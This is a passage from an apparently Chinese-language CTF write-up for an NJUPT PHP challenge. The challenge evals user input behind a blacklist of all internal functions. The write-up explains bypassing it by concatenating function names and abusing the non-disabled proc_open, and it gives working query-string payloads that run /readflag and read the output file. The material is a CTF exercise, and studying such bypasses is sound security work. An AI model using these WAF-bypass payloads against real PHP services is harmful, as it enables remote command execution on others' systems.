class="string">'useful'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">    $dangerous = get_defined_functions();</span><br><span class="line">    array_push($dangerous[<span class="string">"internal"</span>], <span class="string">'eval'</span>, <span class="string">'assert'</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($dangerous[<span class="string">"internal"</span>] <span class="keyword">as</span> $bad) &#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($a,$bad) !== <span class="keyword">FALSE</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(file_exists($usrful))&#123;</span><br><span class="line">    <span class="keyword">if</span>(waf($code))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($code);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"oh,不能输入这些函数哦 :) "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>get_defined_functions()</code></p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\11-2.png" alt="11-2"></p>
+<p>其中</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\11-3.png" alt="11-3"></p>
+<p>所以黑名单就是所有<code>内置函数</code>，然后再加上<code>eval()、assert()</code>。因为php可以按如下方式拼接成一个字符串，所以也就可以完美绕过 WAF</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\11-4.png" alt="11-4"></p>
+<p>我们可以通过以下方式来执行命令</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\11-5.png" alt="11-5"></p>
+<p>disable_function 如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,</span><br><span class="line">pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,</span><br><span class="line">pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,</span><br><span class="line">pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,</span><br><span class="line">pcntl_async_signals,exec,system,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,</span><br><span class="line">error_log,mail,assert,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir,unlink,</span><br><span class="line">delete</span><br></pre></td></tr></table></figure>
+<p>发现<code>proc_open()</code>没有被禁用，可以用过它来命令执行，查看flag。但是并不知道flag的路径，但是发现根目录下有<code>/readflag</code></p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\11-6.png" alt="11-6"></p>
+<p>跑这个文件应该就可以拿下flag，因为<code>proc_open()</code>没有直接地结果返回，我们可以将其结果输出到一个文件，再去读取这个文件，payload如下</p>
+<p>Ps：题目环境不允许重复写文件，过后读也不行，所以打的时候换个文件，马上打马上读</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?useful=/etc/passwd&amp;code=$a=p.r.o.c._.o.p.e.n;$a(&quot;/readflag&gt;/tmp/knlvre&quot;,array(),$z);</span><br></pre></td></tr></table></figure>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\11-7.png" alt="11-7"></p>
+<p>拿下flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?useful=/etc/passwd&amp;code=$a=s.h.o.w._.s.o.u.r.c.e;$a(&quot;/tmp/knlvre&quot;);</span><br></pre></td></tr></table></figure>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\11-8.png" alt="11-8"></p>
 
       
 
